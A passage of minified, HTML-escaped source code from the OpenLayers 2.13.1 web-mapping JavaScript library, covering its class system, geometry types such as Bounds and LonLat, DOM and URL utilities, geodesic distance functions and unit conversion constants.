ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE * POSSIBILITY OF SUCH DAMAGE. */ var OpenLayers={VERSION_NUMBER:"Release 2.13.1",singleFile:!0,_getScriptLocation:function(){for(var a=/(^|(.*?\/))(OpenLayers[^\/]*?\.js)(\?|$)/,b=document.getElementsByTagName("script"),c,d="",e=0,f=b.length;e&lt;f;e++)if(c=b[e].getAttribute("src"))if(c=c.match(a)){d=c[1];break}return function(){return d}}(),ImgPath:""};OpenLayers.Class=function(){var a=arguments.length,b=arguments[0],c=arguments[a-1],d="function"==typeof c.initialize?c.initialize:function(){b.prototype.initialize.apply(this,arguments)};1&lt;a?(a=[d,b].concat(Array.prototype.slice.call(arguments).slice(1,a-1),c),OpenLayers.inherit.apply(null,a)):d.prototype=c;return d}; OpenLayers.inherit=function(a,b){var c=function(){};c.prototype=b.prototype;a.prototype=new c;var d,e,c=2;for(d=arguments.length;c&lt;d;c++)e=arguments[c],"function"===typeof e&amp;&amp;(e=e.prototype),OpenLayers.Util.extend(a.prototype,e)};OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.extend=function(a,b){a=a||{};if(b){for(var c in b){var d=b[c];void 0!==d&amp;&amp;(a[c]=d)}"function"==typeof window.Event&amp;&amp;b instanceof window.Event||(!b.hasOwnProperty||!b.hasOwnProperty("toString"))||(a.toString=b.toString)}return a};OpenLayers.String={startsWith:function(a,b){return 0==a.indexOf(b)},contains:function(a,b){return-1!=a.indexOf(b)},trim:function(a){return a.replace(/^\s\s*/,"").replace(/\s\s*$/,"")},camelize:function(a){a=a.split("-");for(var b=a[0],c=1,d=a.length;c&lt;d;c++)var e=a[c],b=b+(e.charAt(0).toUpperCase()+e.substring(1));return b},format:function(a,b,c){b||(b=window);return a.replace(OpenLayers.String.tokenRegEx,function(a,e){for(var f,g=e.split(/\.+/),h=0;h&lt;g.length;h++){0==h&amp;&amp;(f=b);if(void 0===f)break; f=f[g[h]]}"function"==typeof f&amp;&amp;(f=c?f.apply(null,c):f());return"undefined"==typeof f?"undefined":f})},tokenRegEx:/\$\{([\w.]+?)\}/g,numberRegEx:/^([+-]?)(?=\d|\.\d)\d*(\.\d*)?([Ee]([+-]?\d+))?$/,isNumeric:function(a){return OpenLayers.String.numberRegEx.test(a)},numericIf:function(a,b){var c=a;!0===b&amp;&amp;(null!=a&amp;&amp;a.replace)&amp;&amp;(a=a.replace(/^\s*|\s*$/g,""));return OpenLayers.String.isNumeric(a)?parseFloat(a):c}}; OpenLayers.Number={decimalSeparator:".",thousandsSeparator:",",limitSigDigs:function(a,b){var c=0;0&lt;b&amp;&amp;(c=parseFloat(a.toPrecision(b)));return c},format:function(a,b,c,d){b="undefined"!=typeof b?b:0;c="undefined"!=typeof c?c:OpenLayers.Number.thousandsSeparator;d="undefined"!=typeof d?d:OpenLayers.Number.decimalSeparator;null!=b&amp;&amp;(a=parseFloat(a.toFixed(b)));var e=a.toString().split(".");1==e.length&amp;&amp;null==b&amp;&amp;(b=0);a=e[0];if(c)for(var f=/(-?[0-9]+)([0-9]{3})/;f.test(a);)a=a.replace(f,"$1"+c+"$2"); 0==b?b=a:(c=1&lt;e.length?e[1]:"0",null!=b&amp;&amp;(c+=Array(b-c.length+1).join("0")),b=a+d+c);return b},zeroPad:function(a,b,c){for(a=a.toString(c||10);a.length&lt;b;)a="0"+a;return a}}; OpenLayers.Function={bind:function(a,b){var c=Array.prototype.slice.apply(arguments,[2]);return function(){var d=c.concat(Array.prototype.slice.apply(arguments,[0]));return a.apply(b,d)}},bindAsEventListener:function(a,b){return function(c){return a.call(b,c||window.event)}},False:function(){return!1},True:function(){return!0},Void:function(){}}; OpenLayers.Array={filter:function(a,b,c){var d=[];if(Array.prototype.filter)d=a.filter(b,c);else{var e=a.length;if("function"!=typeof b)throw new TypeError;for(var f=0;f&lt;e;f++)if(f in a){var g=a[f];b.call(c,g,f,a)&amp;&amp;d.push(g)}}return d}};OpenLayers.Bounds=OpenLayers.Class({left:null,bottom:null,right:null,top:null,centerLonLat:null,initialize:function(a,b,c,d){OpenLayers.Util.isArray(a)&amp;&amp;(d=a[3],c=a[2],b=a[1],a=a[0]);null!=a&amp;&amp;(this.left=OpenLayers.Util.toFloat(a));null!=b&amp;&amp;(this.bottom=OpenLayers.Util.toFloat(b));null!=c&amp;&amp;(this.right=OpenLayers.Util.toFloat(c));null!=d&amp;&amp;(this.top=OpenLayers.Util.toFloat(d))},clone:function(){return new OpenLayers.Bounds(this.left,this.bottom,this.right,this.top)},equals:function(a){var b=!1;null!= a&amp;&amp;(b=this.left==a.left&amp;&amp;this.right==a.right&amp;&amp;this.top==a.top&amp;&amp;this.bottom==a.bottom);return b},toString:function(){return[this.left,this.bottom,this.right,this.top].join()},toArray:function(a){return!0===a?[this.bottom,this.left,this.top,this.right]:[this.left,this.bottom,this.right,this.top]},toBBOX:function(a,b){null==a&amp;&amp;(a=6);var c=Math.pow(10,a),d=Math.round(this.left*c)/c,e=Math.round(this.bottom*c)/c,f=Math.round(this.right*c)/c,c=Math.round(this.top*c)/c;return!0===b?e+","+d+","+c+","+f:d+ ","+e+","+f+","+c},toGeometry:function(){return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(this.left,this.bottom),new OpenLayers.Geometry.Point(this.right,this.bottom),new OpenLayers.Geometry.Point(this.right,this.top),new OpenLayers.Geometry.Point(this.left,this.top)])])},getWidth:function(){return this.right-this.left},getHeight:function(){return this.top-this.bottom},getSize:function(){return new OpenLayers.Size(this.getWidth(),this.getHeight())}, getCenterPixel:function(){return new OpenLayers.Pixel((this.left+this.right)/2,(this.bottom+this.top)/2)},getCenterLonLat:function(){this.centerLonLat||(this.centerLonLat=new OpenLayers.LonLat((this.left+this.right)/2,(this.bottom+this.top)/2));return this.centerLonLat},scale:function(a,b){null==b&amp;&amp;(b=this.getCenterLonLat());var c,d;"OpenLayers.LonLat"==b.CLASS_NAME?(c=b.lon,d=b.lat):(c=b.x,d=b.y);return new OpenLayers.Bounds((this.left-c)*a+c,(this.bottom-d)*a+d,(this.right-c)*a+c,(this.top-d)*a+ d)},add:function(a,b){if(null==a||null==b)throw new TypeError("Bounds.add cannot receive null values");return new OpenLayers.Bounds(this.left+a,this.bottom+b,this.right+a,this.top+b)},extend:function(a){if(a)switch(a.CLASS_NAME){case "OpenLayers.LonLat":this.extendXY(a.lon,a.lat);break;case "OpenLayers.Geometry.Point":this.extendXY(a.x,a.y);break;case "OpenLayers.Bounds":this.centerLonLat=null;if(null==this.left||a.left&lt;this.left)this.left=a.left;if(null==this.bottom||a.bottom&lt;this.bottom)this.bottom= a.bottom;if(null==this.right||a.right>this.right)this.right=a.right;if(null==this.top||a.top>this.top)this.top=a.top}},extendXY:function(a,b){this.centerLonLat=null;if(null==this.left||a&lt;this.left)this.left=a;if(null==this.bottom||b&lt;this.bottom)this.bottom=b;if(null==this.right||a>this.right)this.right=a;if(null==this.top||b>this.top)this.top=b},containsLonLat:function(a,b){"boolean"===typeof b&amp;&amp;(b={inclusive:b});b=b||{};var c=this.contains(a.lon,a.lat,b.inclusive),d=b.worldBounds;d&amp;&amp;!c&amp;&amp;(c=d.getWidth(), d=Math.round((a.lon-(d.left+d.right)/2)/c),c=this.containsLonLat({lon:a.lon-d*c,lat:a.lat},{inclusive:b.inclusive}));return c},containsPixel:function(a,b){return this.contains(a.x,a.y,b)},contains:function(a,b,c){null==c&amp;&amp;(c=!0);if(null==a||null==b)return!1;a=OpenLayers.Util.toFloat(a);b=OpenLayers.Util.toFloat(b);var d=!1;return d=c?a>=this.left&amp;&amp;a&lt;=this.right&amp;&amp;b>=this.bottom&amp;&amp;b&lt;=this.top:a>this.left&amp;&amp;a&lt;this.right&amp;&amp;b>this.bottom&amp;&amp;b&lt;this.top},intersectsBounds:function(a,b){"boolean"===typeof b&amp;&amp;(b= {inclusive:b});b=b||{};if(b.worldBounds){var c=this.wrapDateLine(b.worldBounds);a=a.wrapDateLine(b.worldBounds)}else c=this;null==b.inclusive&amp;&amp;(b.inclusive=!0);var d=!1,e=c.left==a.right||c.right==a.left||c.top==a.bottom||c.bottom==a.top;if(b.inclusive||!e)var d=a.top>=c.bottom&amp;&amp;a.top&lt;=c.top||c.top>a.bottom&amp;&amp;c.top&lt;a.top,e=a.left>=c.left&amp;&amp;a.left&lt;=c.right||c.left>=a.left&amp;&amp;c.left&lt;=a.right,f=a.right>=c.left&amp;&amp;a.right&lt;=c.right||c.right>=a.left&amp;&amp;c.right&lt;=a.right,d=(a.bottom>=c.bottom&amp;&amp;a.bottom&lt;=c.top||c.bottom>= a.bottom&amp;&amp;c.bottom&lt;=a.top||d)&amp;&amp;(e||f);if(b.worldBounds&amp;&amp;!d){var g=b.worldBounds,e=g.getWidth(),f=!g.containsBounds(c),g=!g.containsBounds(a);f&amp;&amp;!g?(a=a.add(-e,0),d=c.intersectsBounds(a,{inclusive:b.inclusive})):g&amp;&amp;!f&amp;&amp;(c=c.add(-e,0),d=a.intersectsBounds(c,{inclusive:b.inclusive}))}return d},containsBounds:function(a,b,c){null==b&amp;&amp;(b=!1);null==c&amp;&amp;(c=!0);var d=this.contains(a.left,a.bottom,c),e=this.contains(a.right,a.bottom,c),f=this.contains(a.left,a.top,c);a=this.contains(a.right,a.top,c);return b? d||e||f||a:d&amp;&amp;e&amp;&amp;f&amp;&amp;a},determineQuadrant:function(a){var b="",c=this.getCenterLonLat(),b=b+(a.lat&lt;c.lat?"b":"t");return b+=a.lon&lt;c.lon?"l":"r"},transform:function(a,b){this.centerLonLat=null;var c=OpenLayers.Projection.transform({x:this.left,y:this.bottom},a,b),d=OpenLayers.Projection.transform({x:this.right,y:this.bottom},a,b),e=OpenLayers.Projection.transform({x:this.left,y:this.top},a,b),f=OpenLayers.Projection.transform({x:this.right,y:this.top},a,b);this.left=Math.min(c.x,e.x);this.bottom=Math.min(c.y, d.y);this.right=Math.max(d.x,f.x);this.top=Math.max(e.y,f.y);return this},wrapDateLine:function(a,b){b=b||{};var c=b.leftTolerance||0,d=b.rightTolerance||0,e=this.clone();if(a){for(var f=a.getWidth();e.left&lt;a.left&amp;&amp;e.right-d&lt;=a.left;)e=e.add(f,0);for(;e.left+c>=a.right&amp;&amp;e.right>a.right;)e=e.add(-f,0);c=e.left+c;c&lt;a.right&amp;&amp;(c>a.left&amp;&amp;e.right-d>a.right)&amp;&amp;(e=e.add(-f,0))}return e},CLASS_NAME:"OpenLayers.Bounds"}); OpenLayers.Bounds.fromString=function(a,b){var c=a.split(",");return OpenLayers.Bounds.fromArray(c,b)};OpenLayers.Bounds.fromArray=function(a,b){return!0===b?new OpenLayers.Bounds(a[1],a[0],a[3],a[2]):new OpenLayers.Bounds(a[0],a[1],a[2],a[3])};OpenLayers.Bounds.fromSize=function(a){return new OpenLayers.Bounds(0,a.h,a.w,0)};OpenLayers.Bounds.oppositeQuadrant=function(a){var b;b=""+("t"==a.charAt(0)?"b":"t");return b+="l"==a.charAt(1)?"r":"l"};OpenLayers.Element={visible:function(a){return"none"!=OpenLayers.Util.getElement(a).style.display},toggle:function(){for(var a=0,b=arguments.length;a&lt;b;a++){var c=OpenLayers.Util.getElement(arguments[a]),d=OpenLayers.Element.visible(c)?"none":"";c.style.display=d}},remove:function(a){a=OpenLayers.Util.getElement(a);a.parentNode.removeChild(a)},getHeight:function(a){a=OpenLayers.Util.getElement(a);return a.offsetHeight},hasClass:function(a,b){var c=a.className;return!!c&amp;&amp;RegExp("(^|\\s)"+b+"(\\s|$)").test(c)}, addClass:function(a,b){OpenLayers.Element.hasClass(a,b)||(a.className+=(a.className?" ":"")+b);return a},removeClass:function(a,b){var c=a.className;c&amp;&amp;(a.className=OpenLayers.String.trim(c.replace(RegExp("(^|\\s+)"+b+"(\\s+|$)")," ")));return a},toggleClass:function(a,b){OpenLayers.Element.hasClass(a,b)?OpenLayers.Element.removeClass(a,b):OpenLayers.Element.addClass(a,b);return a},getStyle:function(a,b){a=OpenLayers.Util.getElement(a);var c=null;if(a&amp;&amp;a.style){c=a.style[OpenLayers.String.camelize(b)]; c||(document.defaultView&amp;&amp;document.defaultView.getComputedStyle?c=(c=document.defaultView.getComputedStyle(a,null))?c.getPropertyValue(b):null:a.currentStyle&amp;&amp;(c=a.currentStyle[OpenLayers.String.camelize(b)]));var d=["left","top","right","bottom"];window.opera&amp;&amp;(-1!=OpenLayers.Util.indexOf(d,b)&amp;&amp;"static"==OpenLayers.Element.getStyle(a,"position"))&amp;&amp;(c="auto")}return"auto"==c?null:c}};OpenLayers.LonLat=OpenLayers.Class({lon:0,lat:0,initialize:function(a,b){OpenLayers.Util.isArray(a)&amp;&amp;(b=a[1],a=a[0]);this.lon=OpenLayers.Util.toFloat(a);this.lat=OpenLayers.Util.toFloat(b)},toString:function(){return"lon="+this.lon+",lat="+this.lat},toShortString:function(){return this.lon+", "+this.lat},clone:function(){return new OpenLayers.LonLat(this.lon,this.lat)},add:function(a,b){if(null==a||null==b)throw new TypeError("LonLat.add cannot receive null values");return new OpenLayers.LonLat(this.lon+ OpenLayers.Util.toFloat(a),this.lat+OpenLayers.Util.toFloat(b))},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.lon==a.lon&amp;&amp;this.lat==a.lat||isNaN(this.lon)&amp;&amp;isNaN(this.lat)&amp;&amp;isNaN(a.lon)&amp;&amp;isNaN(a.lat));return b},transform:function(a,b){var c=OpenLayers.Projection.transform({x:this.lon,y:this.lat},a,b);this.lon=c.x;this.lat=c.y;return this},wrapDateLine:function(a){var b=this.clone();if(a){for(;b.lon&lt;a.left;)b.lon+=a.getWidth();for(;b.lon>a.right;)b.lon-=a.getWidth()}return b},CLASS_NAME:"OpenLayers.LonLat"}); OpenLayers.LonLat.fromString=function(a){a=a.split(",");return new OpenLayers.LonLat(a[0],a[1])};OpenLayers.LonLat.fromArray=function(a){var b=OpenLayers.Util.isArray(a);return new OpenLayers.LonLat(b&amp;&amp;a[0],b&amp;&amp;a[1])};OpenLayers.Pixel=OpenLayers.Class({x:0,y:0,initialize:function(a,b){this.x=parseFloat(a);this.y=parseFloat(b)},toString:function(){return"x="+this.x+",y="+this.y},clone:function(){return new OpenLayers.Pixel(this.x,this.y)},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b},distanceTo:function(a){return Math.sqrt(Math.pow(this.x-a.x,2)+Math.pow(this.y-a.y,2))},add:function(a,b){if(null==a||null==b)throw new TypeError("Pixel.add cannot receive null values"); return new OpenLayers.Pixel(this.x+a,this.y+b)},offset:function(a){var b=this.clone();a&amp;&amp;(b=this.add(a.x,a.y));return b},CLASS_NAME:"OpenLayers.Pixel"});OpenLayers.Size=OpenLayers.Class({w:0,h:0,initialize:function(a,b){this.w=parseFloat(a);this.h=parseFloat(b)},toString:function(){return"w="+this.w+",h="+this.h},clone:function(){return new OpenLayers.Size(this.w,this.h)},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.w==a.w&amp;&amp;this.h==a.h||isNaN(this.w)&amp;&amp;isNaN(this.h)&amp;&amp;isNaN(a.w)&amp;&amp;isNaN(a.h));return b},CLASS_NAME:"OpenLayers.Size"});OpenLayers.Console={log:function(){},debug:function(){},info:function(){},warn:function(){},error:function(){},userError:function(a){alert(a)},assert:function(){},dir:function(){},dirxml:function(){},trace:function(){},group:function(){},groupEnd:function(){},time:function(){},timeEnd:function(){},profile:function(){},profileEnd:function(){},count:function(){},CLASS_NAME:"OpenLayers.Console"}; (function(){for(var a=document.getElementsByTagName("script"),b=0,c=a.length;b&lt;c;++b)if(-1!=a[b].src.indexOf("firebug.js")&amp;&amp;console){OpenLayers.Util.extend(OpenLayers.Console,console);break}})();OpenLayers.Lang={code:null,defaultCode:"en",getCode:function(){OpenLayers.Lang.code||OpenLayers.Lang.setCode();return OpenLayers.Lang.code},setCode:function(a){var b;a||(a="msie"==OpenLayers.BROWSER_NAME?navigator.userLanguage:navigator.language);a=a.split("-");a[0]=a[0].toLowerCase();"object"==typeof OpenLayers.Lang[a[0]]&amp;&amp;(b=a[0]);if(a[1]){var c=a[0]+"-"+a[1].toUpperCase();"object"==typeof OpenLayers.Lang[c]&amp;&amp;(b=c)}b||(OpenLayers.Console.warn("Failed to find OpenLayers.Lang."+a.join("-")+" dictionary, falling back to default language"), b=OpenLayers.Lang.defaultCode);OpenLayers.Lang.code=b},translate:function(a,b){var c=OpenLayers.Lang[OpenLayers.Lang.getCode()];(c=c&amp;&amp;c[a])||(c=a);b&amp;&amp;(c=OpenLayers.String.format(c,b));return c}};OpenLayers.i18n=OpenLayers.Lang.translate;OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.getElement=function(){for(var a=[],b=0,c=arguments.length;b&lt;c;b++){var d=arguments[b];"string"==typeof d&amp;&amp;(d=document.getElementById(d));if(1==arguments.length)return d;a.push(d)}return a};OpenLayers.Util.isElement=function(a){return!(!a||1!==a.nodeType)};OpenLayers.Util.isArray=function(a){return"[object Array]"===Object.prototype.toString.call(a)};OpenLayers.Util.removeItem=function(a,b){for(var c=a.length-1;0&lt;=c;c--)a[c]==b&amp;&amp;a.splice(c,1);return a}; OpenLayers.Util.indexOf=function(a,b){if("function"==typeof a.indexOf)return a.indexOf(b);for(var c=0,d=a.length;c&lt;d;c++)if(a[c]==b)return c;return-1};OpenLayers.Util.dotless=/\./g; OpenLayers.Util.modifyDOMElement=function(a,b,c,d,e,f,g,h){b&amp;&amp;(a.id=b.replace(OpenLayers.Util.dotless,"_"));c&amp;&amp;(a.style.left=c.x+"px",a.style.top=c.y+"px");d&amp;&amp;(a.style.width=d.w+"px",a.style.height=d.h+"px");e&amp;&amp;(a.style.position=e);f&amp;&amp;(a.style.border=f);g&amp;&amp;(a.style.overflow=g);0&lt;=parseFloat(h)&amp;&amp;1>parseFloat(h)?(a.style.filter="alpha(opacity="+100*h+")",a.style.opacity=h):1==parseFloat(h)&amp;&amp;(a.style.filter="",a.style.opacity="")}; OpenLayers.Util.createDiv=function(a,b,c,d,e,f,g,h){var k=document.createElement("div");d&amp;&amp;(k.style.backgroundImage="url("+d+")");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="absolute");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,g,h);return k}; OpenLayers.Util.createImage=function(a,b,c,d,e,f,g,h){var k=document.createElement("img");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="relative");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,null,g);h&amp;&amp;(k.style.display="none",b=function(){k.style.display="";OpenLayers.Event.stopObservingElement(k)},OpenLayers.Event.observe(k,"load",b),OpenLayers.Event.observe(k,"error",b));k.style.alt=a;k.galleryImg="no";d&amp;&amp;(k.src=d);return k};OpenLayers.IMAGE_RELOAD_ATTEMPTS=0; OpenLayers.Util.alphaHackNeeded=null;OpenLayers.Util.alphaHack=function(){if(null==OpenLayers.Util.alphaHackNeeded){var a=navigator.appVersion.split("MSIE"),a=parseFloat(a[1]),b=!1;try{b=!!document.body.filters}catch(c){}OpenLayers.Util.alphaHackNeeded=b&amp;&amp;5.5&lt;=a&amp;&amp;7>a}return OpenLayers.Util.alphaHackNeeded}; OpenLayers.Util.modifyAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){OpenLayers.Util.modifyDOMElement(a,b,c,d,f,null,null,k);b=a.childNodes[0];e&amp;&amp;(b.src=e);OpenLayers.Util.modifyDOMElement(b,a.id+"_innerImage",null,d,"relative",g);OpenLayers.Util.alphaHack()&amp;&amp;("none"!=a.style.display&amp;&amp;(a.style.display="inline-block"),null==h&amp;&amp;(h="scale"),a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+b.src+"', sizingMethod='"+h+"')",0&lt;=parseFloat(a.style.opacity)&amp;&amp;1>parseFloat(a.style.opacity)&amp;&amp; (a.style.filter+=" alpha(opacity="+100*a.style.opacity+")"),b.style.filter="alpha(opacity=0)")};OpenLayers.Util.createAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){var l=OpenLayers.Util.createDiv();k=OpenLayers.Util.createImage(null,null,null,null,null,null,null,k);k.className="olAlphaImg";l.appendChild(k);OpenLayers.Util.modifyAlphaImageDiv(l,a,b,c,d,e,f,g,h);return l};OpenLayers.Util.upperCaseObject=function(a){var b={},c;for(c in a)b[c.toUpperCase()]=a[c];return b}; OpenLayers.Util.applyDefaults=function(a,b){a=a||{};var c="function"==typeof window.Event&amp;&amp;b instanceof window.Event,d;for(d in b)if(void 0===a[d]||!c&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty(d)&amp;&amp;!a.hasOwnProperty(d))a[d]=b[d];!c&amp;&amp;(b&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty("toString")&amp;&amp;!a.hasOwnProperty("toString"))&amp;&amp;(a.toString=b.toString);return a}; OpenLayers.Util.getParameterString=function(a){var b=[],c;for(c in a){var d=a[c];if(null!=d&amp;&amp;"function"!=typeof d){if("object"==typeof d&amp;&amp;d.constructor==Array){for(var e=[],f,g=0,h=d.length;g&lt;h;g++)f=d[g],e.push(encodeURIComponent(null===f||void 0===f?"":f));d=e.join(",")}else d=encodeURIComponent(d);b.push(encodeURIComponent(c)+"="+d)}}return b.join("&amp;")};OpenLayers.Util.urlAppend=function(a,b){var c=a;if(b)var d=(a+" ").split(/[?&amp;]/),c=c+(" "===d.pop()?b:d.length?"&amp;"+b:"?"+b);return c}; OpenLayers.Util.getImagesLocation=function(){return OpenLayers.ImgPath||OpenLayers._getScriptLocation()+"img/"};OpenLayers.Util.getImageLocation=function(a){return OpenLayers.Util.getImagesLocation()+a};OpenLayers.Util.Try=function(){for(var a=null,b=0,c=arguments.length;b&lt;c;b++){var d=arguments[b];try{a=d();break}catch(e){}}return a}; OpenLayers.Util.getXmlNodeValue=function(a){var b=null;OpenLayers.Util.Try(function(){b=a.text;b||(b=a.textContent);b||(b=a.firstChild.nodeValue)},function(){b=a.textContent});return b};OpenLayers.Util.mouseLeft=function(a,b){for(var c=a.relatedTarget?a.relatedTarget:a.toElement;c!=b&amp;&amp;null!=c;)c=c.parentNode;return c!=b};OpenLayers.Util.DEFAULT_PRECISION=14;OpenLayers.Util.toFloat=function(a,b){null==b&amp;&amp;(b=OpenLayers.Util.DEFAULT_PRECISION);"number"!==typeof a&amp;&amp;(a=parseFloat(a));return 0===b?a:parseFloat(a.toPrecision(b))}; OpenLayers.Util.rad=function(a){return a*Math.PI/180};OpenLayers.Util.deg=function(a){return 180*a/Math.PI};OpenLayers.Util.VincentyConstants={a:6378137,b:6356752.3142,f:1/298.257223563}; OpenLayers.Util.distVincenty=function(a,b){for(var c=OpenLayers.Util.VincentyConstants,d=c.a,e=c.b,c=c.f,f=OpenLayers.Util.rad(b.lon-a.lon),g=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(a.lat))),h=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(b.lat))),k=Math.sin(g),g=Math.cos(g),l=Math.sin(h),h=Math.cos(h),m=f,n=2*Math.PI,p=20;1E-12&lt;Math.abs(m-n)&amp;&amp;0&lt;--p;){var q=Math.sin(m),r=Math.cos(m),s=Math.sqrt(h*q*h*q+(g*l-k*h*r)*(g*l-k*h*r));if(0==s)return 0;var r=k*l+g*h*r,t=Math.atan2(s,r),u=Math.asin(g*h* q/s),v=Math.cos(u)*Math.cos(u),q=r-2*k*l/v,w=c/16*v*(4+c*(4-3*v)),n=m,m=f+(1-w)*c*Math.sin(u)*(t+w*s*(q+w*r*(-1+2*q*q)))}if(0==p)return NaN;d=v*(d*d-e*e)/(e*e);c=d/1024*(256+d*(-128+d*(74-47*d)));return(e*(1+d/16384*(4096+d*(-768+d*(320-175*d))))*(t-c*s*(q+c/4*(r*(-1+2*q*q)-c/6*q*(-3+4*s*s)*(-3+4*q*q))))).toFixed(3)/1E3}; OpenLayers.Util.destinationVincenty=function(a,b,c){var d=OpenLayers.Util,e=d.VincentyConstants,f=e.a,g=e.b,h=e.f,e=a.lon;a=a.lat;var k=d.rad(b);b=Math.sin(k);k=Math.cos(k);a=(1-h)*Math.tan(d.rad(a));var l=1/Math.sqrt(1+a*a),m=a*l,n=Math.atan2(a,k);a=l*b;for(var p=1-a*a,f=p*(f*f-g*g)/(g*g),q=1+f/16384*(4096+f*(-768+f*(320-175*f))),r=f/1024*(256+f*(-128+f*(74-47*f))),f=c/(g*q),s=2*Math.PI;1E-12&lt;Math.abs(f-s);)var t=Math.cos(2*n+f),u=Math.sin(f),v=Math.cos(f),w=r*u*(t+r/4*(v*(-1+2*t*t)-r/6*t*(-3+4* u*u)*(-3+4*t*t))),s=f,f=c/(g*q)+w;c=m*u-l*v*k;g=Math.atan2(m*v+l*u*k,(1-h)*Math.sqrt(a*a+c*c));b=Math.atan2(u*b,l*v-m*u*k);k=h/16*p*(4+h*(4-3*p));t=b-(1-k)*h*a*(f+k*u*(t+k*v*(-1+2*t*t)));Math.atan2(a,-c);return new OpenLayers.LonLat(e+d.deg(t),d.deg(g))}; OpenLayers.Util.getParameters=function(a,b){b=b||{};a=null===a||void 0===a?window.location.href:a;var c="";if(OpenLayers.String.contains(a,"?"))var d=a.indexOf("?")+1,c=OpenLayers.String.contains(a,"#")?a.indexOf("#"):a.length,c=a.substring(d,c);for(var d={},c=c.split(/[&amp;;]/),e=0,f=c.length;e&lt;f;++e){var g=c[e].split("=");if(g[0]){var h=g[0];try{h=decodeURIComponent(h)}catch(k){h=unescape(h)}g=(g[1]||"").replace(/\+/g," ");try{g=decodeURIComponent(g)}catch(l){g=unescape(g)}!1!==b.splitArgs&amp;&amp;(g=g.split(",")); 1==g.length&amp;&amp;(g=g[0]);d[h]=g}}return d};OpenLayers.Util.lastSeqID=0;OpenLayers.Util.createUniqueID=function(a){a=null==a?"id_":a.replace(OpenLayers.Util.dotless,"_");OpenLayers.Util.lastSeqID+=1;return a+OpenLayers.Util.lastSeqID};OpenLayers.INCHES_PER_UNIT={inches:1,ft:12,mi:63360,m:39.37,km:39370,dd:4374754,yd:36};OpenLayers.INCHES_PER_UNIT["in"]=OpenLayers.INCHES_PER_UNIT.inches;OpenLayers.INCHES_PER_UNIT.degrees=OpenLayers.INCHES_PER_UNIT.dd;OpenLayers.INCHES_PER_UNIT.nmi=1852*OpenLayers.INCHES_PER_UNIT.m; OpenLayers.METERS_PER_INCH=0.0254000508001016; OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{Inch:OpenLayers.INCHES_PER_UNIT.inches,Meter:1/OpenLayers.METERS_PER_INCH,Foot:0.3048006096012192/OpenLayers.METERS_PER_INCH,IFoot:0.3048/OpenLayers.METERS_PER_INCH,ClarkeFoot:0.3047972651151/OpenLayers.METERS_PER_INCH,SearsFoot:0.30479947153867626/OpenLayers.METERS_PER_INCH,GoldCoastFoot:0.3047997101815088/OpenLayers.METERS_PER_INCH,IInch:0.0254/OpenLayers.METERS_PER_INCH,MicroInch:2.54E-5/OpenLayers.METERS_PER_INCH,Mil:2.54E-8/OpenLayers.METERS_PER_INCH, Centimeter:0.01/OpenLayers.METERS_PER_INCH,Kilometer:1E3/OpenLayers.METERS_PER_INCH,Yard:0.9144018288036576/OpenLayers.METERS_PER_INCH,SearsYard:0.914398414616029/OpenLayers.METERS_PER_INCH,IndianYard:0.9143985307444408/OpenLayers.METERS_PER_INCH,IndianYd37:0.91439523/OpenLayers.METERS_PER_INCH,IndianYd62:0.9143988/OpenLayers.METERS_PER_INCH,IndianYd75:0.9143985/OpenLayers.METERS_PER_INCH,IndianFoot:0.30479951/OpenLayers.METERS_PER_INCH,IndianFt37:0.30479841/OpenLayers.METERS_PER_INCH,IndianFt62:0.3047996/ OpenLayers.METERS_PER_INCH,IndianFt75:0.3047995/OpenLayers.METERS_PER_INCH,Mile:1609.3472186944373/OpenLayers.METERS_PER_INCH,IYard:0.9144/OpenLayers.METERS_PER_INCH,IMile:1609.344/OpenLayers.METERS_PER_INCH,NautM:1852/OpenLayers.METERS_PER_INCH,"Lat-66":110943.31648893273/OpenLayers.METERS_PER_INCH,"Lat-83":110946.25736872235/OpenLayers.METERS_PER_INCH,Decimeter:0.1/OpenLayers.METERS_PER_INCH,Millimeter:0.001/OpenLayers.METERS_PER_INCH,Dekameter:10/OpenLayers.METERS_PER_INCH,Decameter:10/OpenLayers.METERS_PER_INCH, Hectometer:100/OpenLayers.METERS_PER_INCH,GermanMeter:1.0000135965/OpenLayers.METERS_PER_INCH,CaGrid:0.999738/OpenLayers.METERS_PER_INCH,ClarkeChain:20.1166194976/OpenLayers.METERS_PER_INCH,GunterChain:20.11684023368047/OpenLayers.METERS_PER_INCH,BenoitChain:20.116782494375872/OpenLayers.METERS_PER_INCH,SearsChain:20.11676512155/OpenLayers.METERS_PER_INCH,ClarkeLink:0.201166194976/OpenLayers.METERS_PER_INCH,GunterLink:0.2011684023368047/OpenLayers.METERS_PER_INCH,BenoitLink:0.20116782494375873/OpenLayers.METERS_PER_INCH, 